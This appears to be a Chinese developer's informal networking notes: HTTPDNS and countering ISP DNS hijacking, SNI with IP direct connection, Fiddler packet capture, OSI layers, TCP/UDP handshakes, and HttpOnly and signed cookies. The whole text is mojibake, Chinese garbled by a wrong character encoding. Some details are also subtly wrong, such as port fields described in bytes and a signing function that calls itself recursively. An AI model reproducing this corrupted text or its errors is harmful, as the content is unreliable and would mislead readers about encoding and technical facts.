(360ã€è…¾è®¯ã€å°ç±³ã€ä»Šæ—¥å¤´æ¡ç­‰å…¬å¸è”åæŠµåˆ¶è¿è¥å•†æµé‡åŠ«æŒ)å®¢æˆ·ç«¯åDNSåŠ«æŒçš„æ‰‹æ®µ(ipç›´è¿)ï¼š é­é‡DNSåŠ«æŒ IPç›´è¿ï¼Œhttpdnsçš„åŸç†éå¸¸ç®€å•ï¼Œä¸»è¦æœ‰ä¸¤æ­¥ï¼šAã€å®¢æˆ·ç«¯ç›´æ¥è®¿é—®HttpDNSæ¥å£(ç›´æ¥ç”¨ipåœ°å€è®¿é—®)ï¼Œè·å–ä¸šåŠ¡åœ¨åŸŸåé…ç½®ç®¡ç†ç³»ç»Ÿä¸Šé…ç½®çš„è®¿é—®å»¶è¿Ÿæœ€ä¼˜çš„IPã€‚ï¼ˆåŸºäºå®¹ç¾è€ƒè™‘ï¼Œè¿˜æ˜¯ä¿ç•™æ¬¡é€‰ä½¿ç”¨è¿è¥å•†LocalDNSè§£æåŸŸåçš„æ–¹å¼ï¼‰Bã€å®¢æˆ·ç«¯å‘è·å–åˆ°çš„IPåå°±å‘ç›´æ¥å¾€æ­¤IPå‘é€ä¸šåŠ¡åè®®è¯·æ±‚ã€‚ä»¥Httpè¯·æ±‚ä¸ºä¾‹ï¼Œé€šè¿‡åœ¨headerä¸­æŒ‡å®šhostå­—æ®µï¼Œå‘HttpDNSè¿”å›çš„IPå‘é€æ ‡å‡†çš„Httpè¯·æ±‚å³å¯ã€‚httpsï¼Œæ³¨æ„httpsæ˜¯è§£å†³é“¾è·¯åŠ«æŒçš„æ–¹æ¡ˆï¼Œå¹¶æ— æ³•è§£å†³DNSåŠ«æŒçš„é—®é¢˜ã€‚httpså®‰å…¨ä½†æ€§èƒ½ç¨å·® httpdnsæ–¹æ¡ˆåŠéœ€è¦æ³¨æ„çš„ç‚¹éå¸¸å¤š ç¾å›¢ è¯ä¹¦æ ¡éªŒ,sniï¼Œè¿˜æœ‰ipç›´è¿å¯¼è‡´çš„è¿æ¥å¤ç”¨å¤±æ•ˆç­‰ç­‰sniåœºæ™¯ä¸‹å¯èƒ½å‡ºç°çš„é—®é¢˜ é€šå¸¸æƒ…å†µä¸‹ï¼Œä¸€å°æœåŠ¡å™¨å¾€å¾€ä¼šé…ç½®å¤šä¸ªåŸŸåæ¥å»ºç«‹ä¸åŒ Web ç«™ç‚¹æˆ–æä¾›ä¸åŒçš„æœåŠ¡ã€‚ä¾‹å¦‚ï¼ŒåŸŸå a.com å’Œ b.com éƒ½åŒæ—¶è§£æåˆ°åŒä¸€ IP 1.1.1.1 ä¸Šï¼Œç„¶åæœåŠ¡å™¨æ ¹æ®å®¢æˆ·ç«¯è¯·æ±‚ä¸­çš„ Host å­—æ®µæ¥åŒºåˆ†ï¼Œå°†è¯·æ±‚åˆ†é…ç»™ä¸åŒçš„åå°æœåŠ¡æ¥å¤„ç†ã€‚å¦‚å‰é¢æ‰€è¿°ï¼Œå¯¹äº HTTPS è¯·æ±‚å‰ï¼Œéœ€è¦é¢å¤–è¿›è¡Œ SSL/TLS æ¡æ‰‹ï¼Œä½†æ˜¯ç”±äºæœåŠ¡å™¨é…ç½®äº†å¤šä¸ªåŸŸåçš„ SSL è¯ä¹¦ï¼Œåœ¨æ¡æ‰‹å‘é€è¯ä¹¦æ—¶ï¼Œä¸çŸ¥é“å®¢æˆ·ç«¯è®¿é—®çš„æ˜¯å“ªä¸ªåŸŸåï¼ˆå› ä¸ºæ¡æ‰‹æ˜¯åœ¨æŸä¸€å…·ä½“è¯·æ±‚ä¹‹å‰è¿›è¡Œçš„ï¼‰ï¼Œæ‰€ä»¥æ— æ³•æ ¹æ®ä¸åŒåŸŸåå‘é€ä¸åŒçš„è¯ä¹¦ã€‚SNI(Server Name Indication) å°±æ˜¯ä¸ºäº†è§£å†³ä¸€ä¸ªæœåŠ¡å™¨ä½¿ç”¨å¤šä¸ªåŸŸåå’Œè¯ä¹¦çš„ SSL/TLS æ‰©å±•ã€‚å®ƒçš„å·¥ä½œåŸç†æ˜¯ï¼šåœ¨è¿›è¡Œ SSL/TLS æ¡æ‰‹ä¹‹å‰ï¼Œå…ˆå‘é€è¦è®¿é—®ç«™ç‚¹çš„åŸŸåï¼ˆHostnameï¼‰ï¼Œè¿™æ ·æœåŠ¡å™¨ä¼šæ ¹æ®è¿™ä¸ªåŸŸåè¿”å›ä¸€ä¸ªåˆé€‚çš„è¯ä¹¦ã€‚ç›®å‰ï¼Œå¤§å¤šæ•°æ“ä½œç³»ç»Ÿå’Œæµè§ˆå™¨ä»¥åŠä¸»æµ HTTP æœåŠ¡å™¨è½¯ä»¶éƒ½å·²ç»å¾ˆå¥½åœ°æ”¯æŒ SNI æ‰©å±•ã€‚ä½†æ˜¯åŒæ ·çš„é—®é¢˜åˆæ¥äº†ï¼Œå½“æˆ‘ä»¬é‡‡ç”¨ HTTPDNS è§£æåŸŸåï¼Œå¦‚å‰æ‰€è¿°ï¼Œè¯·æ±‚ URL ä¸­çš„ host ä¼šè¢«æ›¿æ¢æˆè§£æåçš„ IPï¼Œæ­¤æ—¶æ¡æ‰‹å‰å‘é€çš„ SNI å­—æ®µæ˜¯ IPï¼Œå¯¼è‡´æœåŠ¡å™¨æœ€ç»ˆè·å–åˆ°çš„â€åŸŸåâ€ä»ç„¶ä¸º IPï¼Œæ— æ³•æ‰¾åˆ°åŒ¹é…çš„è¯ä¹¦ï¼Œåªèƒ½è¿”å›é»˜è®¤çš„è¯ä¹¦æˆ–è€…ä¸è¿”å›ï¼Œæ‰€ä»¥ä¹Ÿä¼šå‡ºç° SSL/TLS æ¡æ‰‹ä¸æˆåŠŸçš„é”™è¯¯ã€‚ sniè§£å†³æ–¹æ¡ˆ WebViewä¸­åè¿è¥å•†DNSåŠ«æŒçš„æ‰‹æ®µç”Ÿäº§ç¯å¢ƒä½¿ç”¨è…¾è®¯äº‘çš„httpdnså¾—äº†,è…¾è®¯äº‘çš„ç½‘ç«™ä¸Šä¹ŸæŒ‚å‡ºäº†ä¸€ä¸ªdnsè§£æçš„å…¥å£ javaå±‚ç”¨åå°„æ¥ç®¡InetAddress.getAllByNameï¼Œ nativeå±‚æŠŠ getaddrinfo çš„å†…å­˜åœ°å€æ›¿æ¢æˆè‡ªå®šä¹‰çš„ my_getaddrinfo åœ°å€ ç›®å‰okHttpæ˜¯ä¸éµå®ˆdnsçš„ttlæŸ¥è¯¢ç»“æœçš„ Jesse Wilsonçš„ä¾æ®æ˜¯ï¼Œæµè§ˆå™¨æ²¡è¿™ä¹ˆåš è‡³äºåŸç†å˜›ï¼šåœ¨è…¾è®¯äº‘çš„httpdnsçš„jaræ–‡ä»¶è§£å‹ä¹‹åæ‰¾åˆ°ä¸€ä¸ªMSDKDnsResolveræ–‡ä»¶ï¼Œé‡Œé¢æœ‰å‡ ä¸ªå¾ˆæ˜¾çœ¼çš„ip:182.254.116.117182.254.16.100æ‰¾ä¸€ä¸‹è¿™ä¸ªip: å¹¿ä¸œçœæ·±åœ³å¸‚ æ·±åœ³å¸‚è…¾è®¯è®¡ç®—æœºç³»ç»Ÿæœ‰é™å…¬å¸ç”µä¿¡èŠ‚ç‚¹(BGP)ï¼Œ ipç›´è¿æ— ç–‘äº†ã€‚è…¾è®¯äº‘çš„æ–‡æ¡£ä¸Šè¿˜æŒ‡å‡ºWebViewClientæœ‰ä¸€ä¸ªæ–¹æ³•shouldInterceptRequestå¯ä»¥åœ¨webviewé‡Œé¢ä½¿ç”¨ ä»Šæ—¥å¤´æ¡ã€å°ç±³ã€è…¾è®¯ç­‰å…­å…¬å¸è”åˆæŠµåˆ¶æµé‡åŠ«æŒ å·²æœ‰å¤šé¡¹è¯æ®ç›´æ¥æŒ‡å‘æŸäº›æœºæ„ 8.FiddleræŠ“åŒ… æ‰‹æœºå’Œç”µè„‘è¿æ¥åŒä¸€ä¸ªwifi ä»https://www.telerik.com/download/fiddler ä¸‹è½½Fiddler å¯åŠ¨å¹¶é…ç½®: Tools-&gt;Fiddler-&gt;Connections, check â€œallow remote computers to connectâ€ and default port is 8888 é…ç½®æ‰‹æœºï¼šé€‰æ‹©è¿æ¥çš„ç½‘ç»œ-&gt;ä¿®æ”¹ç½‘ç»œ-&gt;ä»£ç†è®¾ç½®:æ‰‹åŠ¨; ä»£ç†æœåŠ¡å™¨ä¸»æœºåä¸ºç”µè„‘çš„ipï¼Œç«¯å£8888ï¼Œip DHCP æŠ“åŒ…æŸ¥çœ‹ 9.Ajaxå’ŒjQueryå‘èµ·POSTè¯·æ±‚çš„æ—¶å€™è®¾ç½®çš„Content-Typeå¯¹äºæœåŠ¡å™¨å¾ˆé‡è¦AJAX POSTè¯·æ±‚ä¸­å‚æ•°ä»¥form dataå’Œrequest payloadå½¢å¼åœ¨servletä¸­çš„è·å–æ–¹å¼ æœ€è¿‘åœ¨çœ‹ä¹¦æ—¶æ‰çœŸæ­£ææ˜ç™½ï¼ŒæœåŠ¡å™¨ä¸ºä»€ä¹ˆä¼šå¯¹è¡¨å•æäº¤å’Œæ–‡ä»¶ä¸Šä¼ åšç‰¹æ®Šå¤„ç†ï¼Œå› ä¸ºè¡¨å•æäº¤æ•°æ®æ˜¯åå€¼å¯¹çš„æ–¹å¼ï¼Œä¸”Content-Typeä¸ºapplication/x-www-form-urlencodedï¼Œè€Œæ–‡ä»¶ä¸Šä¼ æœåŠ¡å™¨éœ€è¦ç‰¹æ®Šå¤„ç†ï¼Œæ™®é€šçš„postè¯·æ±‚ï¼ˆContent-Typeä¸æ˜¯application/x-www-form-urlencodedï¼‰æ•°æ®æ ¼å¼ä¸å›ºå®šï¼Œä¸ä¸€å®šæ˜¯åå€¼å¯¹çš„æ–¹å¼ï¼Œæ‰€ä»¥æœåŠ¡å™¨æ— æ³•çŸ¥é“å…·ä½“çš„å¤„ç†æ–¹å¼ï¼Œæ‰€ä»¥åªèƒ½é€šè¿‡è·å–åŸå§‹æ•°æ®æµçš„æ–¹å¼æ¥è¿›è¡Œè§£æã€‚jqueryåœ¨æ‰§è¡Œpostè¯·æ±‚æ—¶ï¼Œä¼šè®¾ç½®Content-Typeä¸ºapplication/x-www-form-urlencodedï¼Œæ‰€ä»¥æœåŠ¡å™¨èƒ½å¤Ÿæ­£ç¡®è§£æï¼Œè€Œä½¿ç”¨åŸç”Ÿajaxè¯·æ±‚æ—¶ï¼Œå¦‚æœä¸æ˜¾ç¤ºçš„è®¾ç½®Content-Typeï¼Œé‚£ä¹ˆé»˜è®¤æ˜¯text/plainï¼Œè¿™æ—¶æœåŠ¡å™¨å°±ä¸çŸ¥é“æ€ä¹ˆè§£ææ•°æ®äº†ï¼Œæ‰€ä»¥æ‰åªèƒ½é€šè¿‡è·å–åŸå§‹æ•°æ®æµçš„æ–¹å¼æ¥è¿›è¡Œè§£æè¯·æ±‚æ•°æ®ã€‚ ===========================trash here=====================================ç»å¸¸è¯´çš„ç½‘é€Ÿ bps (bits per second)ï¼Œæ‰€ä»¥è·Ÿbyteæ¯”èµ·æ¥ï¼Œè¦é™¤ä»¥8ã€‚1024kbpsçš„å¸¦å®½å°±æ„å‘³ç€æ¯ç§’ä¼ é€’çš„æ•°æ®å¤§å°ä¸º1024/8=128KBã€‚1024så°±æ˜¯128MBï¼ˆè¿™ä¸‹æ¸…æ¥šäº†ï¼‰ css spritesåœ¨http2çš„ç¯å¢ƒä¸‹å¹¶ä¸å®Œå…¨æ— æ•ˆ ä¸€äº›ä¼˜åŒ–[TTFB] TTFBï¼ˆTime To First Byteï¼‰ï¼Œå®¢æˆ·ç«¯å‘å‡ºè¯·æ±‚åˆ°æ”¶åˆ°å“åº”çš„ç¬¬ä¸€ä¸ªå­—èŠ‚æ‰€èŠ±è´¹çš„æ—¶é—´ã€‚ä¸€èˆ¬æµè§ˆå™¨é‡Œé¢éƒ½èƒ½çœ‹åˆ°ï¼Œè¿™ä¹Ÿæ˜¯æœåŠ¡ç«¯å¯ä»¥ä¼˜åŒ–çš„æŒ‡æ ‡ã€‚ GZipå‹ç¼©æ–‡æœ¬è¿˜å¯ä»¥ï¼Œå›¾ç‰‡å°±æ²¡å¿…è¦å¼€å‹ç¼©äº†ï¼Œå› ä¸ºå›¾ç‰‡æœ¬èº«å°±é«˜åº¦å‹ç¼©äº†ï¼Œå†å‹åªæ˜¯æµªè´¹CPUã€‚ ç½‘ç»œåè®®ï¼Œæ¶æ„ï¼Œè§„èŒƒï¼Œspdy,http2,urlè§„èŒƒ.OSIä¸ƒå±‚ç½‘ç»œä½“ç³»ç»“æ„ ï¼š ç‰©ç†å±‚(IEEE 802.2)ã€æ•°æ®é“¾è·¯å±‚(ARP,RARP)ã€ç½‘ç»œå±‚(ip,icmp)ã€ä¼ è¾“å±‚(tcp,udp)ã€è¡¨ç¤ºå±‚ã€ä¼šè¯å±‚(SSL,TLS)ã€åº”ç”¨å±‚(HTTP,FTP,SMTP,POP3).è¿™é‡Œé¢Socketæ¯”è¾ƒç‰¹æ®Šï¼ŒSocketæ˜¯ä¸€ç»„ç¼–ç¨‹æ¥å£ï¼ˆAPIï¼‰ã€‚ä»‹äºä¼ è¾“å±‚å’Œåº”ç”¨å±‚ï¼Œå‘åº”ç”¨å±‚æä¾›ç»Ÿä¸€çš„ç¼–ç¨‹æ¥å£ã€‚åº”ç”¨å±‚ä¸å¿…äº†è§£TCP/IPåè®®ç»†èŠ‚ã€‚ç›´æ¥é€šè¿‡å¯¹Socketæ¥å£å‡½æ•°çš„è°ƒç”¨å®Œæˆæ•°æ®åœ¨IPç½‘ç»œçš„ä¼ è¾“ã€‚ OSI Model 7 - application / firefox/chrome/email/HTTP6 - Presentation OS / letters$numbers -&gt; ASCII5 - Session / Conversation between computers4 - Transport / Packets are delived reliably(æ¯”å¦‚å‘é€é¡ºåºå’Œæ¥å—é¡ºåºä¸€è‡´)3 - Network / Dtetermine best route for data2 - Data link / NICSâ€™s(Network interface cards) checking for errors(æ¯”å¦‚switches)1 - Physical Cabel / fiber optic cable / electronic signals è®ºhttpsä½äºosiçš„ç¬¬å‡ ä¸ªå±‚çº§The SSL protocol is implemented as a transparent wrapper around the HTTP protocol. In terms of the OSI model, itâ€™s a bit of a grey area. It is usually implemented in the application layer, but strictly speaking is in the session layer. Modem(è°ƒåˆ¶è§£è°ƒå™¨)ï¼šè°ƒåˆ¶è§£è°ƒå™¨æ˜¯ä¸€ç§è®¡ç®—æœºç¡¬ä»¶ï¼Œå®ƒèƒ½æŠŠè®¡ç®—æœºçš„æ•°å­—ä¿¡å·ç¿»è¯‘æˆå¯æ²¿æ™®é€šç”µè¯çº¿ä¼ é€çš„æ¨¡æ‹Ÿä¿¡å·ï¼Œè€Œè¿™äº›æ¨¡æ‹Ÿä¿¡å·åˆå¯è¢«çº¿è·¯å¦ä¸€ç«¯çš„å¦ä¸€ä¸ªè°ƒåˆ¶è§£è°ƒå™¨æ¥æ”¶ï¼Œå¹¶è¯‘æˆè®¡ç®—æœºå¯æ‡‚çš„è¯­è¨€ã€‚è¿™ä¸€ç®€å•è¿‡ç¨‹å®Œæˆäº†ä¸¤å°è®¡ç®—æœºé—´çš„é€šä¿¡(ç”µæµå˜åŒ–-&gt; æ— çº¿ç”µ è¿™ä¸ªè¿‡ç¨‹å«åšè°ƒåˆ¶ï¼Œæ— çº¿ç”µå¼•èµ·ç”µç£åœºå˜åŒ–ä»è€Œäº§ç”Ÿç”µæµå˜åŒ–ï¼Œè¿™ä¸ªè¿‡ç¨‹å«åšè§£è°ƒ)ã€‚ç”µä¿¡åŠå®½å¸¦ç»å¸¸é€çš„å…‰çŒ«çš„å­¦åå«åšå…‰ç½‘ç»œç»ˆç«¯ï¼ˆä¿—ç§°å…‰çŒ«æˆ–å…‰modemï¼‰ï¼Œæ˜¯æŒ‡é€šè¿‡å…‰çº¤ä»‹è´¨è¿›è¡Œä¼ è¾“ï¼Œå°†å…‰ä¿¡å·è°ƒåˆ¶è§£è°ƒä¸ºå…¶ä»–åè®®ä¿¡å·çš„ç½‘ç»œè®¾å¤‡ã€‚å…‰çŒ«è®¾å¤‡ä½œä¸ºå¤§å‹å±€åŸŸç½‘ã€åŸåŸŸç½‘å’Œå¹¿åŸŸç½‘çš„ä¸­ç»§ä¼ è¾“è®¾å¤‡ã€‚ä¸åŒäºå…‰çº¤æ”¶å‘å™¨ï¼Œå…‰çº¤æ”¶å‘å™¨åªæ˜¯æ”¶å…‰å’Œå‘å…‰ï¼Œä¸æ¶‰åŠåˆ°åè®®çš„è½¬æ¢ã€‚å…¶å®å°±æ˜¯æŠŠ0110è¿™äº›äºŒè¿›åˆ¶è½¬æ¢æˆåœ¨å…‰çº¤ä¸­ä¼ è¾“çš„å…‰ä¿¡å·ã€‚ HLSç›´æ’­æµæ…¢(å»¶è¿Ÿé«˜)æ˜¯å› ä¸ºåŸºäºHTTPï¼Œ(http live streamingï¼Œè‹¹æœæå‡ºçš„)å¦‚æœè¦ä½å»¶è¿Ÿè¿˜å¾—rmtp åº”ç”¨å±‚é¢çš„Httpï¼ŒSMTP,FTP,POP,TLS/SSL,IMAP tcpå’Œudpçš„å…¨åæ˜¯ï¼šTransmission Control Protocol (TCP)User Datagram Protocol (UDP) tcpä¸‰æ¬¡æ¡æ‰‹ï¼Œå››æ¬¡æŒ¥æ‰‹åœ¨UDPä¸­ï¼Œæ¯æ¬¡å‘é€æ•°æ®æŠ¥æ—¶ï¼Œéœ€è¦é™„å¸¦ä¸Šæœ¬æœºçš„socketæè¿°ç¬¦å’Œæ¥æ”¶ç«¯çš„socketæè¿°ç¬¦ã€‚è€Œç”±äºTCPæ˜¯åŸºäºè¿æ¥çš„åè®®ï¼Œåœ¨é€šä¿¡çš„socketå¯¹ä¹‹é—´éœ€è¦åœ¨é€šä¿¡ä¹‹å‰å»ºç«‹è¿æ¥ï¼Œå› æ­¤ä¼šæœ‰å»ºç«‹è¿æ¥è¿™ä¸€è€—æ—¶å­˜åœ¨äºTCPåè®®çš„socketç¼–ç¨‹ã€‚ åœ¨UDPä¸­ï¼Œæ•°æ®æŠ¥æ•°æ®åœ¨å¤§å°ä¸Šæœ‰64KBçš„é™åˆ¶ã€‚è€ŒTCPä¸­ä¹Ÿä¸å­˜åœ¨è¿™æ ·çš„é™åˆ¶ã€‚ä¸€æ—¦TCPé€šä¿¡çš„socketå¯¹å»ºç«‹äº†è¿æ¥ï¼Œä»–ä»¬ä¹‹é—´çš„é€šä¿¡å°±ç±»ä¼¼IOæµï¼Œæ‰€æœ‰çš„æ•°æ®ä¼šæŒ‰ç…§æ¥å—æ—¶çš„é¡ºåºè¯»å–ã€‚udpçš„å¦ä¸€ä¸ªä¸å¯é çš„åŸå› åœ¨äºï¼Œtcpæœ‰æ»‘åŠ¨çª—å£æœºåˆ¶ï¼Œè€Œudpæ²¡æœ‰ï¼Œæ‰€ä»¥å¦‚æœæ¥æ”¶ç«¯æ²¡æœ‰è¶³å¤Ÿå¿«çš„å°†æ•°æ®æ‹·èµ°ï¼Œé‚£ä¹ˆåæ¥çš„æ•°æ®å°±ä¼šæŠŠæ—§çš„è¿˜æ²¡æ¥å¾—åŠæ‹·è´èµ°çš„æ•°æ®ç»™è¦†ç›–æ‰ï¼Œé€ æˆä¸¢åŒ…ã€‚ UDPæ˜¯ä¸€ç§ä¸å¯é çš„åè®®ï¼Œå‘é€çš„æ•°æ®æŠ¥ä¸ä¸€å®šä¼šæŒ‰ç…§å…¶å‘é€é¡ºåºè¢«æ¥æ”¶ç«¯çš„socketæ¥å—ã€‚(å¦ä¸€ä¸ª)ç„¶è€ŒTCPæ˜¯ä¸€ç§å¯é çš„åè®®ã€‚æ¥æ”¶ç«¯æ”¶åˆ°çš„åŒ…çš„é¡ºåºå’ŒåŒ…åœ¨å‘é€ç«¯çš„é¡ºåºæ˜¯ä¸€è‡´çš„ã€‚ TCPé€‚åˆäºè¯¸å¦‚è¿œç¨‹ç™»å½•(rlogin,telnet)å’Œæ–‡ä»¶ä¼ è¾“ï¼ˆFTPï¼‰è¿™ç±»çš„ç½‘ç»œæœåŠ¡ã€‚å› ä¸ºè¿™äº›éœ€è¦ä¼ è¾“çš„æ•°æ®çš„å¤§å°ä¸ç¡®å®šã€‚è€ŒUDPç›¸æ¯”TCPæ›´åŠ ç®€å•è½»é‡ä¸€äº›ã€‚UDPç”¨æ¥å®ç°å®æ—¶æ€§è¾ƒé«˜æˆ–è€…ä¸¢åŒ…ä¸é‡è¦çš„ä¸€äº›æœåŠ¡ã€‚åœ¨å±€åŸŸç½‘ä¸­UDPçš„ä¸¢åŒ…ç‡éƒ½ç›¸å¯¹æ¯”è¾ƒä½ã€‚ tls,httpsåŠ å¯†è¿‡ç¨‹ï¼Œsha1å’Œsha256åŠ å¯†ç®—æ³• ping ,traceRouter tcpä¸‰æ¬¡æ¡æ‰‹å››æ¬¡æŒ¥æ‰‹ï¼Œç”¨äººè¯è¯´ï¼šå› ä¸ºHTTPæ˜¯ä¸€ä¸ªåŸºäºTCPçš„åè®®,è€ŒTCPæ˜¯ä¸€ç§å¯é çš„ä¼ è¾“å±‚åè®®.å»ºç«‹TCPè¿æ¥æ—¶ä¼šå‘ç”Ÿ:ä¸‰æ¬¡æ¡æ‰‹(three-way handshake)firefox &gt; nginx [SYN] åœ¨ä¹ˆnginx &gt; firefox [SYN, ACK] åœ¨firefox &gt; nginx [ACK] çŸ¥é“äº† å…³é—­TCPè¿æ¥æ—¶ä¼šå‘ç”Ÿ:å››æ¬¡æŒ¥æ‰‹(four-way handshake)firefox &gt; nginx [FIN] æˆ‘è¦å…³é—­è¿æ¥äº†nginx &gt; firefox [ACK] çŸ¥é“äº†,ç­‰æˆ‘å‘å®ŒåŒ…å…ˆnginx &gt; firefox [FIN] æˆ‘ä¹Ÿå…³é—­è¿æ¥äº†firefox &gt; nginx [ACK] å¥½çš„,çŸ¥é“äº† å‡ ä¸ªæŠ¥æ–‡çš„æ ‡è¯†çš„è§£é‡Š:SYN: synchronization(åŒæ­¥)ACK: acknowledgement(ç¡®è®¤:å‘ŠçŸ¥å·²æ”¶åˆ°)FIN: finish(ç»“æŸ) é“¾æ¥ï¼šhttps://www.zhihu.com/question/67772889/answer/257170215 å¼€å¯æµè§ˆå™¨å†…æ”¯æŒwebpå…³äºWebPæ¥å…¥æ–¹æ¡ˆä¸€èˆ¬çš„åšæ³•æ˜¯åœ¨nginxé‡Œé¢åˆ¤æ–­è¯·æ±‚å¤´ï¼Œå¦‚æœæœ‰accept: image/webp è¿™æ ·çš„å­—æ®µçš„è¯ï¼Œé‚£ä¹ˆå°±è¿”å›webpå›¾ç‰‡ï¼Œå¦åˆ™è¿”å›pngå›¾ç‰‡ï¼Œå½“ç„¶webpå›¾ç‰‡å¯èƒ½æ˜¯ä¸´æ—¶ç”Ÿæˆçš„ã€‚ å•ä¸ªç½‘å¡æœ€å¤š65535ä¸ªç«¯å£2çš„16æ¬¡æ–¹ = 65536ã€‚ 2çš„32æ¬¡æ–¹ = 4GBï¼ˆå¤§è‡´æ˜¯32ä½ç³»ç»Ÿä¸èƒ½è¯†åˆ«4Gä»¥ä¸Šå†…å­˜çš„åŸå› ï¼‰wikiä¸Šå¯¹äºtcpçš„è§£é‡Šæè¿°äº†ä¸€ä¸ªæ•°æ®åŒ…çš„ç»“æ„ä¸­ï¼Œå‰ä¸¤ä¸ªbyte(16ä¸ªbitï¼Œ2çš„16æ¬¡æ–¹)ç”¨äºå­˜å‚¨source portï¼Œç¬¬16-31ä¸ªbyteå­˜å‚¨destination port(ä¾æ—§æ˜¯2ä¸ªbytesï¼Œ2çš„16æ¬¡æ–¹)ã€‚è¿™ä¹Ÿå°±æ˜¯65536ä¸ªç«¯å£é™åˆ¶çš„ç”±æ¥ã€‚ çŸ­ç½‘å€(short URL)ç³»ç»Ÿçš„åŸç†åŠå…¶å®ç° 301 æ˜¯æ°¸ä¹…é‡å®šå‘ï¼Œ302 æ˜¯ä¸´æ—¶é‡å®šå‘ã€‚çŸ­åœ°å€ä¸€ç»ç”Ÿæˆå°±ä¸ä¼šå˜åŒ–ï¼Œæ‰€ä»¥ç”¨ 301 æ˜¯ç¬¦åˆ http è¯­ä¹‰çš„ã€‚åŒæ—¶å¯¹æœåŠ¡å™¨å‹åŠ›ä¹Ÿä¼šæœ‰ä¸€å®šå‡å°‘ã€‚ä½†æ˜¯å¦‚æœä½¿ç”¨äº† 301ï¼Œæˆ‘ä»¬å°±æ— æ³•ç»Ÿè®¡åˆ°çŸ­åœ°å€è¢«ç‚¹å‡»çš„æ¬¡æ•°äº†ã€‚è€Œè¿™ä¸ªç‚¹å‡»æ¬¡æ•°æ˜¯ä¸€ä¸ªéå¸¸æœ‰æ„æ€çš„å¤§æ•°æ®åˆ†ææ•°æ®æºã€‚èƒ½å¤Ÿåˆ†æå‡ºçš„ä¸œè¥¿éå¸¸éå¸¸å¤šã€‚æ‰€ä»¥é€‰æ‹©302è™½ç„¶ä¼šå¢åŠ æœåŠ¡å™¨å‹åŠ›ï¼Œä½†æ˜¯æˆ‘æƒ³æ˜¯ä¸€ä¸ªæ›´å¥½çš„é€‰æ‹©ã€‚ Androidå¾®ä¿¡æ™ºèƒ½å¿ƒè·³æ–¹æ¡ˆä¸ºä»€ä¹ˆåŸºäºTCPçš„åº”ç”¨éœ€è¦å¿ƒè·³åŒ…ï¼ˆTCP keep-aliveåŸç†åˆ†æï¼‰ Socketåˆ†ä¸ºInternet Socket(å­¦åå«åšBerkeley or BSD sockets)å’ŒUnix domian Socketï¼Œå‰è€…æ˜¯ç”¨äºç½‘ç»œé€šä¿¡çš„ï¼Œåè€…æ˜¯ç”¨äºåŒä¸€ä¸ªhostä¸Šä¸åŒProcessé—´é€šä¿¡çš„ ipv6 ping6 å‚è€ƒ è°ˆè°ˆHTTPåè®®ä¸­çš„çŸ­è½®è¯¢ã€é•¿è½®è¯¢ã€é•¿è¿æ¥å’ŒçŸ­è¿æ¥ httpè¯·æ±‚çš„TCPç“¶é¢ˆ Restfullæ¶æ„è¯¦è§£ æ–‡ä»¶æ–­ç‚¹ç»­ä¼ åŸç†,CountdownLatch æ–­ç‚¹ç»­ä¼ å®ç° ä¸€å¼ éå¸¸å¥½çš„è§£é‡Šstatus codeçš„è¡¨æ ¼ tcp-ipè¾ƒå¥½çš„è§£é‡Š åŸºæœ¬ç®—æ˜¯è®¡ç®—æœºç½‘ç»œæ•™ç¨‹çš„ C10Ké—®é¢˜ æœåŠ¡å™¨å¸¸ç”¨ç«¯å£ä»¥åŠTCP/UDPç«¯å£åˆ—è¡¨ tcp dump + wireSharkæŠ“åŒ…è¯¦ç»†æ•™ç¨‹ HttpOnlyå°±æ˜¯åœ¨è®¾ç½®cookieæ—¶æ¥å—è¿™æ ·ä¸€ä¸ªå‚æ•°ï¼Œä¸€æ—¦è¢«è®¾ç½®ï¼Œåœ¨æµè§ˆå™¨çš„documentå¯¹è±¡ä¸­å°±çœ‹ä¸åˆ°cookieäº†,ä¸»è¦æ˜¯ä¸ºäº†é¿å…ï¼ˆcross-site scriptingï¼‰XSS attack è¯´å¾—å†ç®€å•ä¸€ç‚¹ï¼Œå°±æ˜¯åå°ä¸‹å‘çš„Response Headerä¸€èˆ¬æ˜¯è¿™æ ·çš„ â€œSet-Cookie:ticketid=supersecret13;Path=/;HttpOnly=true;â€ HttpOnly = true çš„ï¼Œå¯¹äºJsæ¥è®²ï¼Œdocument.cookieé‡Œé¢æ˜¯æ‹¿ä¸åˆ°è¿™ä¸ªkeyçš„ ä¸è®©jsæ“ä½œä¹Ÿæ˜¯æœ‰åŸå› çš„ï¼Œé¿å…ä¸€æ®µæ¶æ„çš„scriptè„šæœ¬æ’åˆ°ç½‘é¡µä¸­ï¼Œè¿™æ®µscriptå°±èƒ½å¤Ÿé€šè¿‡document.cookieè¯»å–åˆ°ç”¨æˆ·èº«ä»½éªŒè¯ç›¸å…³ä¿¡æ¯ï¼Œé‚£æ ·æ”»å‡»è€…å°±èƒ½æ‹¿ç€ç”¨æˆ·çš„åˆæ³•éªŒè¯ä¿¡æ¯å†’å……æ­¤ç”¨æˆ·äº† cookie å’Œ sessionå‚è€ƒ ç­¾å(signedCookies)serverä¸€èˆ¬ä¸ä¼šåœ¨clientç«¯cookieä¸­ä¿ç•™æ•æ„Ÿä¿¡æ¯ï¼Œæ‰€ä»¥æ¯”æ–¹è¯´æˆ‘ä»¬è¦å­˜ä¸€ä¸ªuser_idï¼Œæ­£å¸¸ä¹Ÿåº”è¯¥å­˜åœ¨sessionä¸­ï¼ˆåå°çš„redisæ ¹æ®è¯·æ±‚å¤´ä¸­çš„session_idè‡ªå·±å»æ‰¾ï¼‰ã€‚å‡å¦‚éè¦å­˜clientç«¯çš„cookieä¸­ï¼Œå¯ä»¥è¿™ä¹ˆå¹²ï¼šseverç«¯ä¿ç•™ä¸€æ®µéšæœºçš„Stringï¼Œserverå°†ç”¨æˆ·çš„user_id(å­˜åœ¨åå°)ç”¨sha1ç®—æ³•åŠ å¯†æ¯”å¦‚ var secret = &quot;some_very_important_key&quot;; // è¿™æ®µsecretè¶Šé•¿ï¼Œæš´åŠ›ç ´è§£çš„éš¾åº¦è¶Šå¤§ function sha1(real_user_id){ return sha1(secret+real_user_id); } å®é™…ä½¿ç”¨ä¸­:user_idï¼š John Doeå³ â€œsome_very_important_keyJohn Doeâ€ = â€˜a0d63c5c4194a1d2a67b96391d8d52954ac3512eâ€™;åœ¨çº¿sha1å·¥å…·æ‰€ä»¥clientç«¯æœ€ç»ˆä¿å­˜çš„æ˜¯â€user_id_signedâ€: 